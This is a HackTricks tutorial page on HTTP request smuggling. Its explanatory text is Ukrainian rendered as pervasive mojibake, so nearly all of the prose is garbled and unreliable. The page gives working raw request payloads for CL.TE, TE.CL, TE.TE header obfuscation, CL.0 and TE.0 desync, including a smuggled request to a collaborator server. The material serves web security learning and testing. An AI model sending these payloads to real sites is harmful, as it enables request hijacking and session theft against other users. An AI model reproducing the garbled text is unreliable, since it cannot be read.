# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## –©–æ —Ç–∞–∫–µ

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ **–¥–µ—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è** –º—ñ–∂ **—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–º–∏ –ø—Ä–æ–∫—Å—ñ** —Ç–∞ **–±–µ–∫–µ–Ω–¥** —Å–µ—Ä–≤–µ—Ä–æ–º –¥–æ–∑–≤–æ–ª—è—î **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É** **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏** HTTP **–∑–∞–ø–∏—Ç**, —è–∫–∏–π –±—É–¥–µ **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π** —è–∫ **–æ–¥–∏–Ω –∑–∞–ø–∏—Ç** —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–º–∏ –ø—Ä–æ–∫—Å—ñ (–±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è/—Ä–µ–≤–µ—Ä—Å-–ø—Ä–æ–∫—Å—ñ) —Ç–∞ **—è–∫ 2 –∑–∞–ø–∏—Ç–∏** –±–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä–æ–º.\
–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç, —è–∫–∏–π –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –¥–æ –±–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä–∞ –ø—ñ—Å–ª—è –π–æ–≥–æ**.

### –¢–µ–æ—Ä—ñ—è

[**RFC –°–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—è (2161)**](https://tools.ietf.org/html/rfc2616)

> –Ø–∫—â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –æ—Ç—Ä–∏–º–∞–Ω–æ –∑ –æ–±–æ–º–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ Transfer-Encoding —Ç–∞ Content-Length, –æ—Å—Ç–∞–Ω–Ω—ñ–π –ü–û–í–ò–ù–ï–ù –±—É—Ç–∏ –ø—Ä–æ—ñ–≥–Ω–æ—Ä–æ–≤–∞–Ω–∏–π.

**Content-Length**

> –ó–∞–≥–æ–ª–æ–≤–æ–∫ Content-Length –≤–∫–∞–∑—É—î –Ω–∞ —Ä–æ–∑–º—ñ—Ä —Ç—ñ–ª–∞ —Å—É—Ç–Ω–æ—Å—Ç—ñ –≤ –±–∞–π—Ç–∞—Ö, –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏—Ö –æ—Ç—Ä–∏–º—É–≤–∞—á—É.

**Transfer-Encoding: chunked**

> –ó–∞–≥–æ–ª–æ–≤–æ–∫ Transfer-Encoding –≤–∫–∞–∑—É—î –Ω–∞ —Ñ–æ—Ä–º—É –∫–æ–¥—É–≤–∞–Ω–Ω—è, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –±–µ–∑–ø–µ—á–Ω–æ—ó –ø–µ—Ä–µ–¥–∞—á—ñ —Ç—ñ–ª–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É.\
> Chunked –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–µ–ª–∏–∫—ñ –¥–∞–Ω—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è —Å–µ—Ä—ñ—î—é —á–∞—Å—Ç–∏–Ω.

### –†–µ–∞–ª—å–Ω—ñ—Å—Ç—å

**–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π** (–±–∞–ª–∞–Ω—Å—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è / –†–µ–≤–µ—Ä—Å-–ø—Ä–æ–∫—Å—ñ) **–æ–±—Ä–æ–±–ª—è—î** _**content-length**_ –∞–±–æ _**transfer-encoding**_ –∑–∞–≥–æ–ª–æ–≤–æ–∫, –∞ **–±–µ–∫–µ–Ω–¥** —Å–µ—Ä–≤–µ—Ä **–æ–±—Ä–æ–±–ª—è—î —ñ–Ω—à–∏–π**, –≤–∏–∫–ª–∏–∫–∞—é—á–∏ **–¥–µ—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é** –º—ñ–∂ 2 —Å–∏—Å—Ç–µ–º–∞–º–∏.\
–¶–µ –º–æ–∂–µ –±—É—Ç–∏ –¥—É–∂–µ –∫—Ä–∏—Ç–∏—á–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –æ–¥–∏–Ω –∑–∞–ø–∏—Ç** –¥–æ —Ä–µ–≤–µ—Ä—Å-–ø—Ä–æ–∫—Å—ñ, —è–∫–∏–π –±—É–¥–µ **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π** –±–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä–æ–º **—è–∫ 2 —Ä—ñ–∑–Ω—ñ –∑–∞–ø–∏—Ç–∏**. **–ù–µ–±–µ–∑–ø–µ–∫–∞** —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ **–±–µ–∫–µ–Ω–¥** —Å–µ—Ä–≤–µ—Ä **—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î** **2-–π –∑–∞–ø–∏—Ç, —â–æ —ñ–Ω–∂–µ–∫—Ç—É—î—Ç—å—Å—è**, —è–∫ —è–∫—â–æ –± –≤—ñ–Ω **–Ω–∞–¥—ñ–π—à–æ–≤ –≤—ñ–¥ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞**, –∞ **—Ä–µ–∞–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç** —Ü—å–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –±—É–¥–µ **—á–∞—Å—Ç–∏–Ω–æ—é** **—ñ–Ω–∂–µ–∫—Ç–æ–≤–∞–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É**.

### –û—Å–æ–±–ª–∏–≤–æ—Å—Ç—ñ

–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –≤ HTTP **—Å–∏–º–≤–æ–ª –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞ —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è –∑ 2 –±–∞–π—Ç—ñ–≤:**

* **Content-Length**: –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–¥–µ—Å—è—Ç–∫–æ–≤–µ —á–∏—Å–ª–æ** –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ **–∫—ñ–ª—å–∫–æ—Å—Ç—ñ** **–±–∞–π—Ç—ñ–≤** —Ç—ñ–ª–∞ –∑–∞–ø–∏—Ç—É. –¢—ñ–ª–æ, —è–∫ –æ—á—ñ–∫—É—î—Ç—å—Å—è, –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –æ—Å—Ç–∞–Ω–Ω—ñ–º —Å–∏–º–≤–æ–ª–æ–º, **–Ω–æ–≤–∏–π —Ä—è–¥–æ–∫ –Ω–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω –≤ –∫—ñ–Ω—Ü—ñ –∑–∞–ø–∏—Ç—É**.
* **Transfer-Encoding:** –¶–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤ **—Ç—ñ–ª—ñ** **—à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–µ —á–∏—Å–ª–æ** –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ **–∫—ñ–ª—å–∫–æ—Å—Ç—ñ** **–±–∞–π—Ç—ñ–≤** **–Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞**. **–ß–∞—Å—Ç–∏–Ω–∞** –ø–æ–≤–∏–Ω–Ω–∞ **–∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è** **–Ω–æ–≤–∏–º —Ä—è–¥–∫–æ–º**, –∞–ª–µ —Ü–µ–π –Ω–æ–≤–∏–π —Ä—è–¥–æ–∫ **–Ω–µ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è** —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º –¥–æ–≤–∂–∏–Ω–∏. –¶–µ–π –º–µ—Ç–æ–¥ –ø–µ—Ä–µ–¥–∞—á—ñ –ø–æ–≤–∏–Ω–µ–Ω –∑–∞–∫—ñ–Ω—á—É–≤–∞—Ç–∏—Å—è **—à–º–∞—Ç–∫–æ–º —Ä–æ–∑–º—ñ—Ä–æ–º 0, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—é—Ç—å 2 –Ω–æ–≤—ñ —Ä—è–¥–∫–∏**: `0`
* **Connection**: –ó–≥—ñ–¥–Ω–æ –∑ –º–æ—ó–º –¥–æ—Å–≤—ñ–¥–æ–º, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`Connection: keep-alive`** –≤ –ø–µ—Ä—à–æ–º—É –∑–∞–ø–∏—Ç—ñ –ø—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ HTTP Request Smuggling.

## –û—Å–Ω–æ–≤–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏

{% hint style="success" %}
–ö–æ–ª–∏ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Burp Suite **–≤–∏–º–∫–Ω—ñ—Ç—å `Update Content-Length` —Ç–∞ `Normalize HTTP/1 line endings`** –≤ –ø–æ–≤—Ç–æ—Ä—é–≤–∞—á—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–µ—è–∫—ñ –≥–∞–¥–∂–µ—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –Ω–æ–≤–∏–º–∏ —Ä—è–¥–∫–∞–º–∏, –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è–º–∏ –∫–∞—Ä–µ—Ç–∫–∏ —Ç–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏–º–∏ content-length.
{% endhint %}

HTTP request smuggling –∞—Ç–∞–∫–∏ —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è —à–ª—è—Ö–æ–º –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –Ω–µ–æ–¥–Ω–æ–∑–Ω–∞—á–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤, —è–∫—ñ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—Ç—å —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –≤ —Ç–æ–º—É, —è–∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—ñ —Ç–∞ –±–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä–∏ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏ `Content-Length` (CL) —Ç–∞ `Transfer-Encoding` (TE). –¶—ñ –∞—Ç–∞–∫–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ—è–≤–ª—è—Ç–∏—Å—è –≤ —Ä—ñ–∑–Ω–∏—Ö —Ñ–æ—Ä–º–∞—Ö, –≥–æ–ª–æ–≤–Ω–∏–º —á–∏–Ω–æ–º —è–∫ **CL.TE**, **TE.CL** —Ç–∞ **TE.TE**. –ö–æ–∂–µ–Ω —Ç–∏–ø –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —É–Ω—ñ–∫–∞–ª—å–Ω—É –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—é —Ç–æ–≥–æ, —è–∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—ñ —Ç–∞ –±–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä–∏ –ø—Ä—ñ–æ—Ä–∏—Ç–∏–∑—É—é—Ç—å —Ü—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏. –í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–Ω–∏–∫–∞—é—Ç—å —á–µ—Ä–µ–∑ —Ç–µ, —â–æ —Å–µ—Ä–≤–µ—Ä–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ –∑–∞–ø–∏—Ç –ø–æ-—Ä—ñ–∑–Ω–æ–º—É, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω–∏—Ö —ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –Ω–∞—Å–ª—ñ–¥–∫—ñ–≤.

### –û—Å–Ω–æ–≤–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ —Ç–∏–ø—ñ–≤ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
–î–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ—ó —Ç–∞–±–ª–∏—Ü—ñ —Å–ª—ñ–¥ –¥–æ–¥–∞—Ç–∏ —Ç–µ—Ö–Ω—ñ–∫—É TE.0, —è–∫ —Ç–µ—Ö–Ω—ñ–∫—É CL.0, –∞–ª–µ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º Transfer Encoding.
{% endhint %}

#### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CL.TE (Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–º, Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –±–µ–∫–µ–Ω–¥–æ–º)

* **–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π (CL):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* **–ë–µ–∫–µ–Ω–¥ (TE):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Transfer-Encoding`.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –∞—Ç–∞–∫–∏:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç, –¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length` –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ñ–∞–∫—Ç–∏—á–Ω—ñ–π –¥–æ–≤–∂–∏–Ω—ñ –≤–º—ñ—Å—Ç—É.
* –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–µ—Å—å –∑–∞–ø–∏—Ç –¥–æ –±–µ–∫–µ–Ω–¥—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è `Content-Length`.
* –ë–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä –æ–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç —è–∫ —á–∞—Å—Ç–∫–æ–≤–∏–π —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Transfer-Encoding: chunked`, —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—á–∏ –∑–∞–ª–∏—à–∫–æ–≤—ñ –¥–∞–Ω—ñ —è–∫ –æ–∫—Ä–µ–º–∏–π, –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å TE.CL (Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–º, Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –±–µ–∫–µ–Ω–¥–æ–º)

* **–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π (TE):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Transfer-Encoding`.
* **–ë–µ–∫–µ–Ω–¥ (CL):** –û–±—Ä–æ–±–ª—è—î –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –∞—Ç–∞–∫–∏:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î —á–∞—Å—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç, –¥–µ —Ä–æ–∑–º—ñ—Ä —á–∞—Å—Ç–∏–Ω–∏ (`7b`) —Ç–∞ —Ñ–∞–∫—Ç–∏—á–Ω–∞ –¥–æ–≤–∂–∏–Ω–∞ –≤–º—ñ—Å—Ç—É (`Content-Length: 4`) –Ω–µ –∑–±—ñ–≥–∞—é—Ç—å—Å—è.
* –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä, –ø–æ–≤–∞–∂–∞—é—á–∏ `Transfer-Encoding`, –ø–µ—Ä–µ—Å–∏–ª–∞—î –≤–µ—Å—å –∑–∞–ø–∏—Ç –¥–æ –±–µ–∫–µ–Ω–¥—É.
* –ë–µ–∫–µ–Ω–¥ —Å–µ—Ä–≤–µ—Ä, –ø–æ–≤–∞–∂–∞—é—á–∏ `Content-Length`, –æ–±—Ä–æ–±–ª—è—î –ª–∏—à–µ –ø–æ—á–∞—Ç–∫–æ–≤—É —á–∞—Å—Ç–∏–Ω—É –∑–∞–ø–∏—Ç—É (`7b` –±–∞–π—Ç—ñ–≤), –∑–∞–ª–∏—à–∞—é—á–∏ —Ä–µ—à—Ç—É —á–∞—Å—Ç–∏–Ω–æ—é –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ–≥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å TE.TE (Transfer-Encoding –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–±–æ–º–∞, –∑ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—î—é)

* **–°–µ—Ä–≤–µ—Ä–∏:** –û–±–∏–¥–≤–∞ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å `Transfer-Encoding`, –∞–ª–µ –æ–¥–∏–Ω –º–æ–∂–µ –±—É—Ç–∏ –æ–±–º–∞–Ω—É—Ç–∏–π, —â–æ–± —ñ–≥–Ω–æ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ —á–µ—Ä–µ–∑ –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—é.
* **–°—Ü–µ–Ω–∞—Ä—ñ–π –∞—Ç–∞–∫–∏:**
* –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç –∑ –æ–±—Ñ—É—Å–∫–æ–≤–∞–Ω–∏–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ `Transfer-Encoding`.
* –í –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫–∏–π —Å–µ—Ä–≤–µ—Ä (—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π –∞–±–æ –±–µ–∫–µ–Ω–¥) –Ω–µ —Ä–æ–∑–ø—ñ–∑–Ω–∞—î –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—é, –º–æ–∂–µ –±—É—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CL.TE –∞–±–æ TE.CL.
* –ù–µ–ø—Ä–æ—Ü–µ—Å–æ–≤–∞–Ω–∞ —á–∞—Å—Ç–∏–Ω–∞ –∑–∞–ø–∏—Ç—É, —è–∫ –≤–∏–¥–Ω–æ –∑ –æ–¥–Ω–æ–≥–æ –∑ —Å–µ—Ä–≤–µ—Ä—ñ–≤, —Å—Ç–∞—î —á–∞—Å—Ç–∏–Ω–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–º—É–≥–ª—ñ–Ω–≥—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **–°—Ü–µ–Ω–∞—Ä—ñ–π CL.CL (Content-Length –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–º, —Ç–∞–∫ —ñ –±–µ–∫–µ–Ω–¥–æ–º)**

* –û–±–∏–¥–≤–∞ —Å–µ—Ä–≤–µ—Ä–∏ –æ–±—Ä–æ–±–ª—è—é—Ç—å –∑–∞–ø–∏—Ç –≤–∏–∫–ª—é—á–Ω–æ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Content-Length`.
* –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–º—É–≥–ª—ñ–Ω–≥—É, –æ—Å–∫—ñ–ª—å–∫–∏ —î —É–∑–≥–æ–¥–∂–µ–Ω—ñ—Å—Ç—å —É —Ç–æ–º—É, —è–∫ –æ–±–∏–¥–≤–∞ —Å–µ—Ä–≤–µ—Ä–∏ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –¥–æ–≤–∂–∏–Ω—É –∑–∞–ø–∏—Ç—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **–°—Ü–µ–Ω–∞—Ä—ñ–π CL.0**

* –í—ñ–¥–Ω–æ—Å–∏—Ç—å—Å—è –¥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤, –¥–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` –ø—Ä–∏—Å—É—Ç–Ω—ñ–π —ñ –º–∞—î –∑–Ω–∞—á–µ–Ω–Ω—è, –≤—ñ–¥–º—ñ–Ω–Ω–µ –≤—ñ–¥ –Ω—É–ª—è, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ —Ç—ñ–ª–æ –∑–∞–ø–∏—Ç—É –º–∞—î –≤–º—ñ—Å—Ç. –ë–µ–∫–µ–Ω–¥ —ñ–≥–Ω–æ—Ä—É—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Content-Length` (—è–∫–∏–π —Ä–æ–∑–≥–ª—è–¥–∞—î—Ç—å—Å—è —è–∫ 0), –∞–ª–µ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∏–π –π–æ–≥–æ –æ–±—Ä–æ–±–ª—è—î.
* –¶–µ –≤–∞–∂–ª–∏–≤–æ –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∞—Ç–∞–∫ —Å–º—É–≥–ª—ñ–Ω–≥—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ç–µ, —è–∫ —Å–µ—Ä–≤–µ—Ä–∏ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å –∫—ñ–Ω–µ—Ü—å –∑–∞–ø–∏—Ç—É.
*   **–ü—Ä–∏–∫–ª–∞–¥:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### –°—Ü–µ–Ω–∞—Ä—ñ–π TE.0

* –Ø–∫ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π, –∞–ª–µ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º TE
* –¢–µ—Ö–Ω—ñ–∫–∞ [–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–∞ —Ç—É—Ç](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **–ü—Ä–∏–∫–ª–∞–¥**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
